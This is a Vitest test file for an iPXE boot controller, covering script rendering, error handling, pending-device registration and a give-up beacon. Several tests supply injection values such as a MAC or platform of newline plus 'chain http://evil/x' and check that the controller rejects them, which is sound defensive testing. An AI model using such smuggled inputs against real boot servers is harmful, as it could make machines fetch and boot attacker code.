import { afterEach, beforeEach, describe, expect, it, vi, type Mock } from 'vitest';

import { deviceRecordSchema, type DeviceRecord } from '../../device-record/device-record.schema';
import { ResolveOutcome, type ResolveResult } from '../../device-record/device-record.service';

import { logWarning } from '../../logger/logger.service';
import { ChainService } from '../chain.service';
import { IpxeServiceError } from '../ipxe-errors';
import type { RenderRequest } from '../ipxe-renderer.helpers';
import { IpxeController, type PendingDeviceFacts, type PendingDeviceRegistrar } from '../ipxe.controller';

vi.mock('../../logger/logger.service', () => ({
  logInfo: vi.fn(async () => {}),
  logError: vi.fn(async () => {}),
  logWarning: vi.fn(async () => {}),
  logDebug: vi.fn(async () => {}),
  ContextLogger: class {
    info = vi.fn(async () => {});
    warning = vi.fn(async () => {});
    error = vi.fn(async () => {});
    debug = vi.fn(async () => {});
  },
  getLogger: vi.fn(() => ({
    info: vi.fn(async () => {}),
    warning: vi.fn(async () => {}),
    error: vi.fn(async () => {}),
    debug: vi.fn(async () => {}),
  })),
}));

interface RecordedReply {
  status: number | null;
  headers: Record<string, string>;
  body: unknown;
}

function recordingReply(): { reply: any; recorded: RecordedReply } {
  const recorded: RecordedReply = { status: null, headers: {}, body: null };
  const reply: any = {
    status(code: number) {
      recorded.status = code;
      return reply;
    },
    header(name: string, value: string) {
      recorded.headers[name.toLowerCase()] = value;
      return reply;
    },
    send(payload: unknown) {
      recorded.body = payload;
      return reply;
    },
  };
  return { reply, recorded };
}

function makeRequest(): any {
  return { headers: {}, ip: '127.0.0.1', query: {}, body: {} };
}

function realRecord(overrides: Partial<DeviceRecord> = {}): DeviceRecord {
  return deviceRecordSchema.parse({
    id: 'abcdef00-0000-0000-0000-000000000002',
    is_placeholder: false,
    status: 'provisioned',
    installed_os: 'ubuntu-22.04',
    ...overrides,
  });
}

interface StubChainService {
  resolveRecord: Mock<(...args: any[]) => any>;
  resolveByPointerOnly: Mock<(...args: any[]) => any>;
  renderForRecord: Mock<(...args: any[]) => any>;
  validateRequest: (request: RenderRequest) => void;
}

function stubChain(opts: {
  resolveResult?: ResolveResult | (() => ResolveResult);
  pointerResult?: ResolveResult | (() => ResolveResult);
  renderResult?: string | (() => string | Promise<string>);
  resolveError?: Error;
  renderError?: Error;
  validateError?: Error;
}): StubChainService {
  const resolveRecord = vi.fn(async (): Promise<ResolveResult> => {
    if (opts.resolveError) throw opts.resolveError;
    const r = opts.resolveResult;
    if (typeof r === 'function') return r();
    return r ?? ResolveOutcome.UNKNOWN;
  });
  const resolveByPointerOnly = vi.fn(async (): Promise<ResolveResult> => {
    const r = opts.pointerResult;
    if (typeof r === 'function') return r();
    return r ?? ResolveOutcome.UNKNOWN;
  });
  const renderForRecord = vi.fn(async (): Promise<string> => {
    if (opts.renderError) throw opts.renderError;
    const r = opts.renderResult;
    if (typeof r === 'function') return r();
    return r ?? '';
  });
  const validateRequest = (_req: RenderRequest): void => {
    if (opts.validateError) throw opts.validateError;
  };
  return { resolveRecord, resolveByPointerOnly, renderForRecord, validateRequest };
}

interface StubResults {
  enqueueResult: Mock<(...args: any[]) => any>;
}

function stubResults(opts: { throwOnEnqueue?: boolean } = {}): StubResults {
  const enqueueResult = vi.fn(async (): Promise<boolean> => {
    if (opts.throwOnEnqueue) throw new Error('results queue exploded');
    return true;
  });
  return { enqueueResult };
}

function buildController(
  stub: StubChainService,
  registrar?: PendingDeviceRegistrar,
  results?: StubResults,
): IpxeController {
  return new IpxeController(
    stub as unknown as ChainService,
    registrar,
    results as unknown as import('../../bullmq/results.service').ResultsService | undefined,
  );
}

describe('iPXE controller — /api/chain', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  it('returns 200 with discovery script on success', async () => {
    const stub = stubChain({
      resolveResult: realRecord(),
      renderResult: '#!ipxe\necho Discovery Mode\nboot',
    });
    const controller = buildController(stub);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint(
      { platform: 'discovery', buildarch: 'x86_64', mac: '00:11:22:33:44:55' },
      makeRequest(),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(recorded.headers['content-type']).toBe('text/plain');
    const body = String(recorded.body);
    expect(body).toContain('#!ipxe');
    expect(body).toContain('Discovery Mode');
  });

  it('serves default-params request', async () => {
    const stub = stubChain({
      resolveResult: ResolveOutcome.UNKNOWN,
      renderResult: '#!ipxe\necho Default Script',
    });
    const controller = buildController(stub);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint({ buildarch: 'x86_64' }, makeRequest(), reply);
    expect(recorded.status).toBe(200);
  });

  it('serves arm64 request', async () => {
    const stub = stubChain({
      resolveResult: realRecord(),
      renderResult: '#!ipxe\necho ARM64 Boot\nboot',
    });
    const controller = buildController(stub);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint(
      { platform: 'deployment', buildarch: 'aarch64', mac: 'aa:bb:cc:dd:ee:ff' },
      makeRequest(),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(String(recorded.body)).toContain('ARM64 Boot');
  });

  it('returns 400 and does not render when platform contains injection characters', async () => {
    const stub = stubChain({
      resolveResult: realRecord(),
      renderResult: '#!ipxe\nboot',
    });
    const registrar = vi.fn(async (): Promise<boolean> => true);
    const controller = buildController(stub, registrar);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint(
      { platform: 'efi\nchain http://evil/x', buildarch: 'x86_64', mac: '00:11:22:33:44:55' },
      makeRequest(),
      reply,
    );
    expect(recorded.status).toBe(400);
    expect(stub.resolveRecord).not.toHaveBeenCalled();
    expect(stub.renderForRecord).not.toHaveBeenCalled();
    expect(registrar).not.toHaveBeenCalled();
  });

  it('returns 400 and does not render when mac contains injection characters', async () => {
    const stub = stubChain({
      resolveResult: realRecord(),
      renderResult: '#!ipxe\nboot',
    });
    const registrar = vi.fn(async (): Promise<boolean> => true);
    const controller = buildController(stub, registrar);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint({ buildarch: 'x86_64', mac: '0011\nchain http://evil/x' }, makeRequest(), reply);
    expect(recorded.status).toBe(400);
    expect(stub.resolveRecord).not.toHaveBeenCalled();
    expect(stub.renderForRecord).not.toHaveBeenCalled();
    expect(registrar).not.toHaveBeenCalled();
  });

  it('returns 400 when validateRequest raises iPXEServiceError', async () => {
    const stub = stubChain({
      validateError: new IpxeServiceError('Unsupported architecture: ppc64le'),
    });
    const controller = buildController(stub);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint({ buildarch: 'ppc64le', mac: 'aa:bb:cc:dd:ee:ff' }, makeRequest(), reply);
    expect(recorded.status).toBe(400);
    expect(String(recorded.body)).toContain('Unsupported architecture');
  });

  it('returns 400 when renderForRecord raises iPXEServiceError', async () => {
    const stub = stubChain({
      resolveResult: realRecord(),
      renderError: new IpxeServiceError('Device not found'),
    });
    const controller = buildController(stub);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint({ buildarch: 'x86_64', mac: '00:11:22:33:44:55' }, makeRequest(), reply);
    expect(recorded.status).toBe(400);
    expect(String(recorded.body)).toContain('Error: Device not found');
  });

  it('returns 500 when an unexpected error propagates', async () => {
    const stub = stubChain({
      resolveError: new Error('boom'),
    });
    const controller = buildController(stub);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint({ buildarch: 'x86_64', mac: '00:11:22:33:44:55' }, makeRequest(), reply);
    expect(recorded.status).toBe(500);
    expect(String(recorded.body)).toContain('Error: Unable to generate iPXE script');
  });

  it('registers pending device when record is UNKNOWN', async () => {
    const stub = stubChain({
      resolveResult: ResolveOutcome.UNKNOWN,
      renderResult: '#!ipxe\nboot',
    });
    const registrar = vi.fn(async (_jobId: string, _facts: PendingDeviceFacts): Promise<boolean> => true);
    const controller = buildController(stub, registrar);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint(
      { buildarch: 'x86_64', mac: '00:11:22:33:44:55', ipmi_mac: 'aa:bb:cc:dd:ee:ff' },
      makeRequest(),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(registrar).toHaveBeenCalledTimes(1);
    const facts = registrar.mock.calls[0]?.[1];
    expect(facts?.mac).toBe('00:11:22:33:44:55');
    expect(facts?.ipmi_mac).toBe('aa:bb:cc:dd:ee:ff');
  });

  it('still boots (200) and warns when registerPendingDevice rejects', async () => {
    const stub = stubChain({
      resolveResult: ResolveOutcome.UNKNOWN,
      renderResult: '#!ipxe\nboot',
    });
    const registrar = vi.fn(async (): Promise<boolean> => {
      throw new Error('redis down');
    });
    const controller = buildController(stub, registrar);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint({ buildarch: 'x86_64', mac: '00:11:22:33:44:55' }, makeRequest(), reply);

    expect(recorded.status).toBe(200);
    expect(stub.renderForRecord).toHaveBeenCalledTimes(1);
    expect(vi.mocked(logWarning)).toHaveBeenCalledWith(
      expect.stringContaining('discovery:pending write failed'),
      expect.anything(),
    );
  });

  it('skips pending registration when KNOWN_RECORD_MISSING', async () => {
    const stub = stubChain({
      resolveResult: ResolveOutcome.KNOWN_RECORD_MISSING,
      renderResult: '#!ipxe\nboot',
    });
    const registrar = vi.fn(async (): Promise<boolean> => true);
    const controller = buildController(stub, registrar);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint({ buildarch: 'x86_64', mac: '00:11:22:33:44:55' }, makeRequest(), reply);
    expect(recorded.status).toBe(200);
    expect(registrar).not.toHaveBeenCalled();
  });

  it('skips pending registration when record resolved to a DeviceRecord', async () => {
    const stub = stubChain({
      resolveResult: realRecord(),
      renderResult: '#!ipxe\nboot',
    });
    const registrar = vi.fn(async (): Promise<boolean> => true);
    const controller = buildController(stub, registrar);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint({ buildarch: 'x86_64', mac: '00:11:22:33:44:55' }, makeRequest(), reply);
    expect(recorded.status).toBe(200);
    expect(registrar).not.toHaveBeenCalled();
  });

  it('registers pending device for a placeholder DeviceRecord so the grid keeps its enrichment', async () => {
    const placeholder = realRecord({
      id: 'abcdef00-0000-0000-0000-000000000001',
      is_placeholder: true,
    });
    const stub = stubChain({
      resolveResult: placeholder,
      renderResult: '#!ipxe\nboot',
    });
    const registrar = vi.fn(async (_jobId: string, _facts: PendingDeviceFacts): Promise<boolean> => true);
    const controller = buildController(stub, registrar);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint(
      {
        buildarch: 'x86_64',
        mac: '00:11:22:33:44:55',
        serial: 'TJYXUSIUKG',
        ipmi_mac: 'aa:bb:cc:dd:ee:ff',
        manufacturer: 'Lenovo',
      },
      makeRequest(),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(registrar).toHaveBeenCalledTimes(1);
    const facts = registrar.mock.calls[0]?.[1];
    expect(facts?.serial).toBe('TJYXUSIUKG');
    expect(facts?.ipmi_mac).toBe('aa:bb:cc:dd:ee:ff');
    expect(facts?.manufacturer).toBe('Lenovo');
  });

  it('skips pending registration for a real, non-placeholder DeviceRecord', async () => {
    const stub = stubChain({
      resolveResult: realRecord(),
      renderResult: '#!ipxe\nboot',
    });
    const registrar = vi.fn(async (): Promise<boolean> => true);
    const controller = buildController(stub, registrar);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint({ buildarch: 'x86_64', mac: '00:11:22:33:44:55' }, makeRequest(), reply);
    expect(recorded.status).toBe(200);
    expect(registrar).not.toHaveBeenCalled();
  });

  it('skips pending registration when no identifier is supplied (fully-bare box)', async () => {
    const stub = stubChain({
      resolveResult: ResolveOutcome.UNKNOWN,
      renderResult: '#!ipxe\nboot',
    });
    const registrar = vi.fn(async (): Promise<boolean> => true);
    const controller = buildController(stub, registrar);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint({ buildarch: 'x86_64' }, makeRequest(), reply);
    expect(recorded.status).toBe(200);
    expect(registrar).not.toHaveBeenCalled();
  });

  it('PXE-05: registers an empty-MAC UNKNOWN box via its system_uuid', async () => {
    const stub = stubChain({
      resolveResult: ResolveOutcome.UNKNOWN,
      renderResult: '#!ipxe\nboot',
    });
    const registrar = vi.fn(async (_jobId: string, _facts: PendingDeviceFacts): Promise<boolean> => true);
    const controller = buildController(stub, registrar);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint(
      { buildarch: 'x86_64', system_uuid: '4c4c4544-0042-4d10-8042-b8c04f303233' },
      makeRequest(),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(registrar).toHaveBeenCalledTimes(1);
    const facts = registrar.mock.calls[0]?.[1];
    expect(facts?.mac).toBe('');
    expect(facts?.system_uuid).toBe('4c4c4544-0042-4d10-8042-b8c04f303233');
  });

  it('PXE-05: registers an empty-MAC UNKNOWN box via its serial when no system_uuid', async () => {
    const stub = stubChain({
      resolveResult: ResolveOutcome.UNKNOWN,
      renderResult: '#!ipxe\nboot',
    });
    const registrar = vi.fn(async (_jobId: string, _facts: PendingDeviceFacts): Promise<boolean> => true);
    const controller = buildController(stub, registrar);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint({ buildarch: 'x86_64', serial: 'SN-XYZ-1' }, makeRequest(), reply);
    expect(recorded.status).toBe(200);
    expect(registrar).toHaveBeenCalledTimes(1);
    expect(registrar.mock.calls[0]?.[1]?.serial).toBe('SN-XYZ-1');
  });

  it('passes extracted identifiers to ChainService.resolveRecord', async () => {
    const stub = stubChain({
      resolveResult: realRecord(),
      renderResult: '#!ipxe\nboot',
    });
    const controller = buildController(stub);
    const { reply, recorded } = recordingReply();
    await controller.chainEndpoint(
      {
        buildarch: 'x86_64',
        mac: '00:11:22:33:44:55',
        ipmi_mac: 'aa:bb:cc:dd:ee:ff',
        serial: 'ABC-123',
        ip: '10.0.0.5',
        ipmi_ip: '10.0.0.9',
        manufacturer: 'Dell',
      },
      makeRequest(),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(stub.resolveRecord).toHaveBeenCalledTimes(1);
    const identifiers = stub.resolveRecord.mock.calls[0]?.[0] as Record<string, string>;
    expect(identifiers.mac).toBe('00:11:22:33:44:55');
    expect(identifiers.ipmi_mac).toBe('aa:bb:cc:dd:ee:ff');
    expect(identifiers.serial).toBe('ABC-123');
    const renderFacts = stub.resolveRecord.mock.calls[0]?.[3] as Record<string, string>;
    expect(renderFacts).toEqual({ ip: '10.0.0.5', ipmi_ip: '10.0.0.9', manufacturer: 'Dell' });
  });
});

describe('iPXE controller — /api/chain-unreachable beacon', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  function makeRequestWithQuery(query: Record<string, string>): any {
    return { headers: {}, ip: '127.0.0.1', query, body: {} };
  }

  it('logs the MAC and attempts and returns 200 so imgfetch succeeds', async () => {
    const controller = buildController(stubChain({}));
    const { reply, recorded } = recordingReply();
    await controller.chainUnreachable(
      { mac: '00-11-22-33-44-55', attempts: '8' },
      makeRequestWithQuery({ mac: '00-11-22-33-44-55', attempts: '8' }),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(vi.mocked(logWarning)).toHaveBeenCalledTimes(1);
    const message = vi.mocked(logWarning).mock.calls[0]?.[0];
    expect(message).toContain('00-11-22-33-44-55');
    expect(message).toContain('8 attempts');
  });

  it('clamps a malformed query and still beacons 200', async () => {
    const controller = buildController(stubChain({}));
    const { reply, recorded } = recordingReply();
    await controller.chainUnreachable(
      { mac: '00:11:22:33:44:55', attempts: 'not-a-number' },
      makeRequestWithQuery({ mac: '00:11:22:33:44:55', attempts: 'not-a-number' }),
      reply,
    );
    expect(recorded.status).toBe(200);
    const message = vi.mocked(logWarning).mock.calls[0]?.[0];
    expect(message).toContain('0 attempts');
  });

  it('rejects an injection MAC at the boundary but still beacons 200', async () => {
    const controller = buildController(stubChain({}));
    const { reply, recorded } = recordingReply();
    await controller.chainUnreachable(
      { mac: '00\nchain http://evil/x', attempts: '8' },
      makeRequestWithQuery({ mac: '00\nchain http://evil/x', attempts: '8' }),
      reply,
    );
    expect(recorded.status).toBe(200);
    const message = vi.mocked(logWarning).mock.calls[0]?.[0];
    expect(message).toContain('(unknown)');
    expect(message).not.toContain('evil');
  });

  it('(1) does not signal the hub when no ResultsService is injected (pre-fix baseline)', async () => {
    const stub = stubChain({ pointerResult: realRecord({ status: 'provisioning', last_job_id: 'job-1' }) });
    const controller = buildController(stub);
    const { reply, recorded } = recordingReply();
    await controller.chainUnreachable(
      { mac: '00-11-22-33-44-55', attempts: '8' },
      makeRequestWithQuery({ mac: '00-11-22-33-44-55', attempts: '8' }),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(stub.resolveByPointerOnly).not.toHaveBeenCalled();
  });

  it('(2) signals provision/job_failed once for a PROVISIONING device with a hub Job id', async () => {
    const record = realRecord({ status: 'provisioning', last_job_id: 'job-1' });
    const stub = stubChain({ pointerResult: record });
    const results = stubResults();
    const controller = buildController(stub, undefined, results);
    const { reply, recorded } = recordingReply();
    await controller.chainUnreachable(
      { mac: '00-11-22-33-44-55', attempts: '8' },
      makeRequestWithQuery({ mac: '00-11-22-33-44-55', attempts: '8' }),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(results.enqueueResult).toHaveBeenCalledTimes(1);
    const args = results.enqueueResult.mock.calls[0]?.[0];
    expect(args).toMatchObject({
      planId: 'job-1',
      deviceId: record.id,
      stepName: 'ipxe_chainload',
      status: 'failed',
      eventType: 'job_failed',
      actionType: 'provision',
    });
    expect(args?.metadata).toMatchObject({ source: 'ipxe_give_up_beacon', attempts: 8 });
    expect(JSON.stringify(args)).not.toContain('00-11-22-33-44-55');
  });

  it('(3) drops the synthetic path when a PROVISIONING device has no hub Job id', async () => {
    const stub = stubChain({ pointerResult: realRecord({ status: 'provisioning', last_job_id: null }) });
    const results = stubResults();
    const controller = buildController(stub, undefined, results);
    const { reply, recorded } = recordingReply();
    await controller.chainUnreachable(
      { mac: '00-11-22-33-44-55', attempts: '8' },
      makeRequestWithQuery({ mac: '00-11-22-33-44-55', attempts: '8' }),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(results.enqueueResult).not.toHaveBeenCalled();
  });

  it('(4) does not signal when the resolved device is already PROVISIONED', async () => {
    const stub = stubChain({ pointerResult: realRecord({ status: 'provisioned', last_job_id: 'job-1' }) });
    const results = stubResults();
    const controller = buildController(stub, undefined, results);
    const { reply, recorded } = recordingReply();
    await controller.chainUnreachable(
      { mac: '00-11-22-33-44-55', attempts: '8' },
      makeRequestWithQuery({ mac: '00-11-22-33-44-55', attempts: '8' }),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(results.enqueueResult).not.toHaveBeenCalled();
  });

  it('(5) does not signal when the MAC resolves to UNKNOWN', async () => {
    const stub = stubChain({ pointerResult: ResolveOutcome.UNKNOWN });
    const results = stubResults();
    const controller = buildController(stub, undefined, results);
    const { reply, recorded } = recordingReply();
    await controller.chainUnreachable(
      { mac: '00-11-22-33-44-55', attempts: '8' },
      makeRequestWithQuery({ mac: '00-11-22-33-44-55', attempts: '8' }),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(results.enqueueResult).not.toHaveBeenCalled();
  });

  it('(6) neither resolves nor signals when the MAC is empty/rejected at the boundary', async () => {
    const stub = stubChain({ pointerResult: realRecord({ status: 'provisioning', last_job_id: 'job-1' }) });
    const results = stubResults();
    const controller = buildController(stub, undefined, results);
    const { reply, recorded } = recordingReply();
    await controller.chainUnreachable(
      { mac: '00\nchain http://evil/x', attempts: '8' },
      makeRequestWithQuery({ mac: '00\nchain http://evil/x', attempts: '8' }),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(stub.resolveByPointerOnly).not.toHaveBeenCalled();
    expect(results.enqueueResult).not.toHaveBeenCalled();
  });

  it('(7) is fail-soft: still beacons 200 and warns when enqueueResult throws', async () => {
    const stub = stubChain({ pointerResult: realRecord({ status: 'provisioning', last_job_id: 'job-1' }) });
    const results = stubResults({ throwOnEnqueue: true });
    const controller = buildController(stub, undefined, results);
    const { reply, recorded } = recordingReply();
    await controller.chainUnreachable(
      { mac: '00-11-22-33-44-55', attempts: '8' },
      makeRequestWithQuery({ mac: '00-11-22-33-44-55', attempts: '8' }),
      reply,
    );
    expect(recorded.status).toBe(200);
    expect(vi.mocked(logWarning)).toHaveBeenCalledWith(
      expect.stringContaining('give-up beacon signal failed'),
      expect.anything(),
    );
  });

  it('(8) uses the non-blocking pointer-only resolve, never the hub-render resolveRecord', async () => {
    const stub = stubChain({ pointerResult: realRecord({ status: 'provisioning', last_job_id: 'job-1' }) });
    const results = stubResults();
    const controller = buildController(stub, undefined, results);
    const { reply } = recordingReply();
    await controller.chainUnreachable(
      { mac: '00-11-22-33-44-55', attempts: '8' },
      makeRequestWithQuery({ mac: '00-11-22-33-44-55', attempts: '8' }),
      reply,
    );
    expect(stub.resolveByPointerOnly).toHaveBeenCalledTimes(1);
    expect(stub.resolveByPointerOnly.mock.calls[0]?.[0]).toEqual({ mac: '00-11-22-33-44-55' });
    expect(stub.resolveRecord).not.toHaveBeenCalled();
  });
});
